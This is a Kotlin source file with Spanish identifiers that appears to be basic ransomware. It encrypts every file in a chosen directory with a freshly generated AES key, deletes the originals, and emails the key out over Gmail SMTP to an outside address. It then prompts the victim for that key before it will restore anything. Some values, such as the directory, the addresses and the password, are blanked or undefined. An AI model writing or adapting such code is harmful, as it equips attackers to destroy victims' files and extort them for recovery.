package happyPackCorreoInicial

import java.io.File
import java.security.Key
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.spec.SecretKeySpec
import java.util.Base64
import javax.mail.*
import javax.mail.internet.*
import java.util.Properties

fun main() {
    val directorioEscritorio = ""

    val clave = generarClaveSimetrica()

    val archivos = File(directorioEscritorio).listFiles()
    archivos?.forEach { archivo ->
        if (archivo.isFile && !archivo.name.endsWith(".enc")) {
            println("Cifrando archivo: ${archivo.name}")
            cifrarArchivo(archivo, clave)
            archivo.delete()
        }
    }

    enviarClavePorCorreo(clave)

    println("Introduce la clave en formato Base64 para descifrar los archivos:")
    val claveBase64 = readLine()?.trim()

    if (claveBase64 != null) {
        val claveDesencriptada = convertirClaveDesdeBase64(claveBase64)
        val archivosCifrados = File(directorioEscritorio).listFiles()
        archivosCifrados?.forEach { archivo ->
            if (archivo.isFile && archivo.name.endsWith(".enc")) {
                descifrarArchivo(archivo, claveDesencriptada)
                archivo.delete()
            }
        }
        println("Archivos descifrados con éxito.")
    } else {
        println("Clave no válida. Los archivos no se han descifrado.")
    }
}

fun generarClaveSimetrica(): Key {
    val keyGen = KeyGenerator.getInstance("AES")
    keyGen.init(128)
    return keyGen.generateKey()
}

// Cifra un archivo
fun cifrarArchivo(archivo: File, clave: Key) {
    val cipher = Cipher.getInstance("AES")
    cipher.init(Cipher.ENCRYPT_MODE, clave)

    val bytes = archivo.readBytes()
    val resultado = cipher.doFinal(bytes)

    val archivoCifrado = File("${archivo.absolutePath}.enc")
    archivoCifrado.writeBytes(resultado)

    println("Archivo cifrado: ${archivoCifrado.name}")
}

fun descifrarArchivo(archivo: File, clave: Key) {
    val cipher = Cipher.getInstance("AES")
    cipher.init(Cipher.DECRYPT_MODE, clave)

    val bytes = archivo.readBytes()
    val resultado = cipher.doFinal(bytes)

    val archivoDescifrado = File(archivo.absolutePath.removeSuffix(".enc"))
    archivoDescifrado.writeBytes(resultado)

    println("Archivo descifrado: ${archivoDescifrado.name}")
}

fun convertirClaveDesdeBase64(base64: String): Key {
    val bytes = Base64.getDecoder().decode(base64)
    return SecretKeySpec(bytes, "AES")
}

fun enviarClavePorCorreo(clave: Key) {
    val claveBase64 = Base64.getEncoder().encodeToString(clave.encoded)

    val correoDestino = "@dominio.com"
    val correoRemitente = "@gmail.com"

    val propiedades = Properties().apply {
        put("mail.smtp.host", "smtp.gmail.com")
        put("mail.smtp.port", "587")
        put("mail.smtp.auth", "true")
        put("mail.smtp.starttls.enable", "true")
    }

    val session = Session.getInstance(propiedades, object : Authenticator() {
        override fun getPasswordAuthentication(): PasswordAuthentication {
            return PasswordAuthentication(correoRemitente, contraseñaCorreo)
        }
    })

    try {
        val mensaje = MimeMessage(session).apply {
            setFrom(InternetAddress(correoRemitente))
            addRecipient(Message.RecipientType.TO, InternetAddress(correoDestino))
            subject = "Clave de cifrado"
            setText("Aquí está la clave de cifrado en formato Base64: $claveBase64")
        }
        Transport.send(mensaje)
        println("Clave enviada por correo.")
    } catch (e: MessagingException) {
        println("Error al enviar el correo: ${e.message}")
        e.printStackTrace()
    }
}
